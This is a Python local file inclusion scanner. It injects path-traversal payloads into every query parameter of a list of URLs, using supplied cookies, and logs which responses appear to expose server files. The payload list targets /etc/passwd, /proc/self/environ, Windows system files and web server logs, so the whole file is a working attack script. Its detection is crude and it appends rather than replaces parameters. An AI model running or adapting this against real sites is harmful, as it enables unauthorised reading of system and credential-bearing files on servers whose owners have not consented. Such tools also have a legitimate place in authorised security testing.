import os
import requests

# List of common LFI payloads
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "/etc/passwd",
    "../../../../../../../../windows/system32/drivers/etc/hosts",
    "../../../../windows/win.ini",
    "../../boot.ini",
    "/proc/self/environ",
    "../../../../../../../../proc/self/environ",
    "../../../../../../../../var/log/apache2/access.log",
    "../../../../../../../../var/log/httpd/access_log",
    "../../../../../../../../var/log/httpd/error_log",
]

def check_lfi_vulnerability(url, param_name, payload, cookies, result_file):
    """
    Checks for LFI vulnerability by injecting a payload into a parameter and analyzing the response.
    """
    # Construct the URL with the payload
    vuln_url = f"{url}&{param_name}={payload}"
    try:
        response = requests.get(vuln_url, cookies=cookies, timeout=10)
        # Basic detection logic
        if "root:" in response.text or "boot loader" in response.text or "bash_profile" in response.text:
            result_file.write(f"[+] LFI vulnerability found at {vuln_url}\n")
        else:
            result_file.write(f"[-] No LFI vulnerability at {vuln_url}\n")
    except Exception as e:
        result_file.write(f"[!] Error checking {vuln_url}: {e}\n")


def lfi_scan_from_file(filename, cookies):
    """
    Reads a file with URLs, extracts parameters, and checks each for LFI vulnerabilities.
    """
    try:
        # Create the output directory for LFI scan results
        output_dir = "./output/lfi_scans"
        os.makedirs(output_dir, exist_ok=True)

        # Generate the result file name
        base_filename = os.path.basename(filename)
        result_filename = f"{os.path.splitext(base_filename)[0]}_lfi.txt"
        result_filepath = os.path.join(output_dir, result_filename)

        # Open result file for writing
        with open(result_filepath, 'w') as result_file:
            with open(filename, 'r') as file:
                urls = file.readlines()

            # Normalize URLs
            urls = [url.strip() for url in urls]

            # Scan each URL for LFI vulnerabilities
            for url in urls:
                query_params = url.split('?')[1] if '?' in url else ''  # Extract parameters after '?'

                if query_params:
                    query_params = query_params.split('&')  # Split into individual parameters
                    for param in query_params:
                        param_name = param.split('=')[0]  # Extract the parameter name
                        for payload in LFI_PAYLOADS:
                            check_lfi_vulnerability(url, param_name, payload, cookies, result_file)
                else:
                    result_file.write(f"[-] No parameters found in {url}\n")
    except Exception as e:
        print(f"[!] Error during LFI scan: {e}")
